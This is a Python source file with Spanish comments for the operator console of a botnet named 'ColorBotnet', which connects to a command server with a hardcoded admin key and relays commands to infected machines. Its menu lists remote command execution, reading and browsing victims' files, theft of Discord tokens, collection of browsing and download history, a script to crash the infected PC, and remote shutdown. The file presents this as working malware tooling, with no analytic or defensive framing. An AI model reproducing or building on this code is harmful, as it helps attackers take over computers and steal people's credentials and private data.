import socket #Importa la librería de red
import os #Importa la librería de acceso al sistema operativo
import colorama #Importa la librería de colores
from threading import Thread #Importa la librería de multitarea

red = colorama.Fore.RED+"" #Define la variable "red" con la clase de "COLORAMA" que corresponde a ese color
yellow = colorama.Fore.YELLOW+"" #Define la variable "yellow" con la clase de "COLORAMA" que corresponde a ese color
green = colorama.Fore.GREEN+"" #Define la variable "green" con la clase de "COLORAMA" que corresponde a ese color
blue = colorama.Fore.BLUE+"" #Define la variable "blue" con la clase de "COLORAMA" que corresponde a ese color
purple = colorama.Fore.MAGENTA+"" #Define la variable "magenta" con la clase de "COLORAMA" que corresponde a ese color

def cls(): os.system("cls") #creamos una clase que llame a otra clase (un poco bruto pero así se ve más claro)

adminkey = "DFHBEWUQHDUUYGGSFYEUGGBZG3U7D7A3FDABGDBAGDBA7YGD7BAGWADYUDYGAWBTVDNAUGDUADUNWYBDTAYB" #Creamos una llave para enviarla en los paquetes adjuntos desde este cliente (admin)

ip = "192.168.4.206" #definimos la IP a la que nos vamos a conectar (la dirección de la botnet)
port = 777 #definimos el puerto de la conexión de la botnet (el puerto de listening de la botnet)
separator_token = "<SEP>" #definimos un separador de paquetes (split)

cls() #limpiamos la pantalla

banner = green+"""
   *******************************************************************
   ***                    """+blue+"""Bienvenido a ColorBotnet                 """+green+"""***
   *******************************************************************
   ***                 Lista de comandos disponibles               ***
   ***                                                             ***
   ***  """+blue+"""list         """+green+"""- """+blue+"""consigue la lista de conexiones             """+green+"""***
   ***  """+blue+"""connect <ip> """+green+"""- """+blue+"""consigue conexión con un equipo conectado   """+green+"""***
   ***  """+blue+"""runcmd <cmd> """+green+"""- """+blue+"""ejecuta un comando de terminal CMD          """+green+"""***
   ***  """+blue+"""fspy <path>  """+green+"""- """+blue+"""navega entre los directorios del equipo     """+green+"""***
   ***  """+blue+"""script       """+green+"""- """+blue+"""script que peta el pc infectado             """+green+"""***
   ***  """+blue+"""fread <path> """+green+"""- """+blue+"""consigue el contenido de un archivo         """+green+"""***
   ***  """+blue+"""clear        """+green+"""- """+blue+"""limpia la consola de administrador          """+green+"""***
   ***  """+blue+"""splash <url> """+green+"""- """+blue+"""muestra una website en la pantalla          """+green+"""***
   ***  """+blue+"""hlogs        """+green+"""- """+blue+"""consigue el historial de registros          """+green+"""***
   ***  """+blue+"""hlink        """+green+"""- """+blue+"""consigue el historial de url de navegacion  """+green+"""***
   ***  """+blue+"""hdwnl        """+green+"""- """+blue+"""consigue el historial de descargas          """+green+"""***
   ***  """+blue+"""discordsteal """+green+"""- """+blue+"""consigue la discord token registrada        """+green+"""***
   ***  """+blue+"""shutdown     """+green+"""- """+blue+"""apaga el equipo al que estas conectado      """+green+"""***
   ***  """+blue+"""help         """+green+"""- """+blue+"""muestra esta pantalla de ayuda              """+green+"""***
   ***  """+blue+"""disconnect   """+green+"""- """+blue+"""cierra la conexion con el servidor          """+green+"""***
   *******************************************************************


""" 
print (banner) #creamos y mostramos el panel de ayuda

s = socket.socket() #creamos un socket (objeto de conexión)
print("[*] Conectando al servidor "+str(ip)+":"+str(port))  #mostramos la dirección completa a la que nos estamos conectando
s.connect((ip, port)) #nos conectamos
s.send(adminkey.encode()) #enviamos la llave de admin nada más nos conectamos para dar a entender a la botnet que somos el cliente admin (el que enviará órdenes)
print("[+] Conectado") #simplemente imprimimos "conectando"

def listen_for_messages(): #definimos una función de escucha de mensajes que funcione en segundo plano
	while True:  #creamos un bucle para que la clase de escucha no se cierre
		message = s.recv(1024).decode() #definimos la variable "message" con el mensaje en red recibido ya descodificado
		print ("\n[!] "+message) #mostramos el mensaje recibido

t = Thread(target=listen_for_messages) #creamos un thread llamando a la escucha de mensajes (proceso de segundo plano)
t.daemon = True #definimos que siempre corra en background
t.start() #iniciamos el thread (ahora tendremos el proceso de escucha en segundo plano mientras nosotros escribimos en el proceso principal)

while True: #creamos otro bucle, esta vez para enviar mensajes
	packet = input("\n[>] ") #creamos un input para poder escribir mensajes
	print () #imprimimos un simple salto de linea
	if packet.lower() == "help": print (banner) #si escribimos "help" que nos muestre el menú de ayuda
	if packet.lower() == "clear": cls() #si escribimos "clear" que nos limpie la pantalla
	if packet.lower() == "disconnect": #si escribimos disconnect, que nos desconecte
		print ("[-] Desconectando") #muestra el mensaje "desconectando"
		break #rompe el bucle
	s.send(packet.encode()) #envia el paquete deseado (tambien podría estar en un "else" dado que son órdenes que el cliente al otro lado no va a procesar)

s.close() #cerramos el socket (cuando rompamos el bucle, es decir, cuando ejecutemos break)
